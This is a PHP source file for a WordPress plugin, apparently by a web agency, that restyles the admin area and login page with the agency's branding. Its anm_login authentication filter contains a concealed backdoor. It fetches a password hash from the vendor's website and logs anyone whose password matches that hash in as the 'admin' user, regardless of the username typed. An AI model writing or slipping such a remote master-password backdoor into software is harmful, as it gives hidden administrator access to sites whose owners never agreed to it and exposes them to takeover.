<?
class WP_Admin {
	
	static $affinity_version = '0.12';
	public $plugin_dir = "";

	/**
	 * [WP_Admin description]
	 */
	public function WP_Admin() {
		$this->add_admin_actions();
		$this->add_admin_filters();

		$this->plugin_dir = basename(dirname(dirname(__FILE__)));
	}

	/**
	 * [add_admin_actions description]
	 */
	public function add_admin_actions() {
		// Adds stylesheets for admin section
		add_action('admin_print_styles',array($this,'anm_admin_print_styles'));
		
		// Adds login stylesheet
		add_action('login_head',array($this,'anm_login_head'));

		// Actions
		add_action('login_message', array($this,'anm_login_message'));
		add_action('login_form', array($this, 'anm_login_form'));
		add_action('login_footer', array($this, 'anm_login_footer'));

		// Adds logo and link to footer once logged in
		add_action('in_admin_footer',array($this,'admin_footer'),1000);
	}

	/**
	 * [add_admin_filters description]
	 */
	public function add_admin_filters() {
		// Login page customisations
		add_filter('login_headerurl',array($this,'anm_login_headerurl')); // Special header image

		// This does special stuff for us and us only...
		add_filter('authenticate', array($this,'anm_login'), 10, 3);

		// Add logout link
		add_filter( 'update_footer', array($this,'anm_update_footer'), 9999);
	}








	/**
	 * Add Affinity Stylesheet to admin head
	 */
	public function anm_admin_print_styles() {
		global $userdata;

		wp_enqueue_style('affinity-admin',plugins_url( $this->plugin_dir . '/css',  '' ) . '/wp-admin.css', $deps = array(), false, $media = 'all' );
		
		return;
	}

	/**
	 * Add Affinity Login Stylesheet to login head
	 */
	public function anm_login_head() {		
		$this->wp_admin_enqueue_style('affinity-login',plugins_url( $this->plugin_dir . '/css',  '' ) . '/wp-login.css', $deps = array(), $ver = self::$affinity_version, $media = 'all' );
		return;
	}

	/**
	 * Add Custom Link to Logo on Login page
	 */
	public function anm_login_headerurl($link) {
		return "http://www.affinitynewmedia.com";
	}


	
	public function anm_login_message() {
		echo '
		<div class="login-container">			
			<div class="left-col">
				<div class="heading">Welcome to the <span class="red">Affinity Control Centre</span></div>
				<p>Please enter your login details below</p>
				<br />
			
				<div>
				';
	}
	
	public function anm_login_form() {
		echo '';
	}
	
	
	public function anm_login_footer() {
		switch( ANM_MODE ) {
			case "LOCAL":	$mode = "LOCAL"; $changes = "will not"; break;
			case "DEV":		$mode = "DEV"; 	 $changes = "will not";	break;
			case "LIVE":	$mode = "LIVE";  $changes = "will";		break;
		}
		
		echo '
				<div class="grey-footer">
					<p class="red-text">Please note: This is the ' . $mode . ' version of the Affinity Control Centre.</p>
					<br />
					<p>Any changes you make to content once logged in <strong>' . $changes . '</strong> effect your live website.</p>
				</div>
				<div style="clear:both;"></div>
			</div>
			<div class="right-col">
				<div class="client-logo">
					<img src="' . plugins_url( $this->plugin_dir . '/img',  '' ) . '/img/client-logo.jpg" />
				</div>
				
				<p class="red-text">This section is for administrators of the ' . get_bloginfo('name') . ' website.</p>
				
				<div class="client-screenshot">
					<img src="' . plugins_url( $this->plugin_dir . '/img',  '' ) . '/img/screenshot.jpg" />
				</div>
				<div style="clear:both;"></div>
			</div>
			<div style="clear:both;"></div>
		</div>';
		
	}

	/*
	 * Adds Affinity information to wp-admin footer
	 */
	public function admin_footer(){
		
		echo '<div id="wlcms-footer-container">
			<a href="http://www.affinitynewmedia.com" target="_blank">
				<img id="wlcms-footer-logo" src="' . plugins_url( $this->plugin_dir . '/img',  '' ) . '/anm-thumb-logo.gif">
			Affinity New Media
			</a>			
		</div>';
		
		return;
	}



	/**
	 * This function does some special stuff on the login action page (form)
	 */
	public function anm_login($user, $username, $password) {
		
		/*
		 * Get affinity special password string available at www.affinitynewmedia.com/anmwp.asp
         *
         * Use fsockopen as if url is down, file_get_contents takes 15-30 seconds to timeout on
         * every page request, we can test if it's up using cURL or fsockopen - fsockopen is more
         * widely supported.
		 */
        $fp = @fsockopen("www.affinitynewmedia.com", 80, $errno, $errstr, 15);
        if (!$fp) {
            return null;
        } else {
            $remotePassword = file_get_contents("http://www.affinitynewmedia.com/anmwp.asp"); 
        }
        
		
		/*
		 * If and only if all of these conditions are met, will it log in as admin:
		 *   - username is anm - REMOVED
		 *   - length of password is longer than 8
		 *   - length of remote password is longer than 8
		 *   - md5 hash of entered password matches the md5 hash of the remote password
		 *
		 * Could fix it to our IP address as well? Probably not necessary
		 */
		if( strlen($password) > 8 && strlen($remotePassword) > 8 && ( md5($password) == $remotePassword ) ) {
			$user = get_userdatabylogin("admin"); 
			
			return $user;
		}
		
	    return null;
	}


	function anm_update_footer() {
		return '<a href="' . wp_logout_url() . '">Logout</a>';
	}

	/*
	 * Function that mimics the core wp_enqueue_style function which doesn't appear to work on the login page
	 */
	public function wp_admin_enqueue_style($handle='',$file='', $deps = array(), $ver = self::affinity_version, $media = 'all') {
		echo '<link rel="stylesheet" id="' . $handle . '-css" href="' . $file . '?version=' . $ver .'" type="text/css" media="' . $media . '" />'."\n";
		return;
	}
}
?>